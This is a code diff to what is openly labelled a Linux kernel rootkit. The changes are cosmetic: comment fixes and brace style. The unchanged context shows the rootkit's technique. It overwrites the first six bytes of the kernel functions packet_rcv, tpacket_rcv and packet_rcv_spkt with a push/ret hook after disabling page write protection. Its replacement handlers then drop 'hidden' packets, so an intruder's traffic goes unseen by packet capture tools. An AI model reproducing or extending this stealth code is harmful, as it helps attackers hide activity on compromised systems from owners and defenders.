@@ -32,6 +32,7 @@ unsigned long tpacket_rcv_flags;
 spinlock_t packet_rcv_spkt_lock;
 unsigned long packet_rcv_spkt_flags;
 
+/* the 'ret' hook we are using */
 char hook[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
 unsigned int *target = (unsigned int *) (hook + 1);
 
@@ -115,7 +116,7 @@ unhook_packet_rcv (void)
 	/* disable write protection */
 	disable_page_protection();
 
-	/* restore the first 10 bytes we changed */
+	/* restore the first 6 bytes we changed */
 	memcpy(packet_rcv, original_packet_rcv, 6);
 
 	/* reenable write protection */
@@ -129,7 +130,7 @@ unhook_tpacket_rcv (void)
 	/* disable write protection */
 	disable_page_protection();
 
-	/* restore the first 10 bytes we changed */
+	/* restore the first 6 bytes we changed */
 	memcpy(tpacket_rcv, original_tpacket_rcv, 6);
 
 	/* reenable write protection */
@@ -143,7 +144,7 @@ unhook_packet_rcv_spkt (void)
 	/* disable write protection */
 	disable_page_protection();
 
-	/* restore the first 10 bytes we changed */
+	/* restore the first 6 bytes we changed */
 	memcpy(packet_rcv_spkt, original_packet_rcv_spkt, 6); 
 
 	/* reenable write protection */
@@ -158,9 +159,9 @@ manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct pack
 	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
 
 	/* check if we need to hide this packet */	
-	if(is_packet_hidden(skb))
-	{	
+	if(is_packet_hidden(skb)) {	
 		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv'.\n");
+		
 		spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
 		return 0; 
 	}
@@ -182,10 +183,10 @@ manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct pac
 	int ret;
 	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
 	
-	if(is_packet_hidden(skb))
-	/* check if we need to hide this packet */	
-	{	
-		ROOTKIT_DEBUG("Dropped a packet in 'tpacket_rcv'.\n"); 
+	/* check if we need to hide this packet */
+	if(is_packet_hidden(skb)) {		
+		ROOTKIT_DEBUG("Dropped a packet in 'tpacket_rcv'.\n");
+		
 		spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
 		return 0; 
 	}
@@ -207,10 +208,10 @@ manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct
 	int ret;
 	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 	
-	if(is_packet_hidden(skb))
 	/* check if we need to hide this packet */	
-	{	
+	if(is_packet_hidden(skb)) {	
 		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv_spkt'.\n");
+		
 		spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 		return 0; 
 	} 
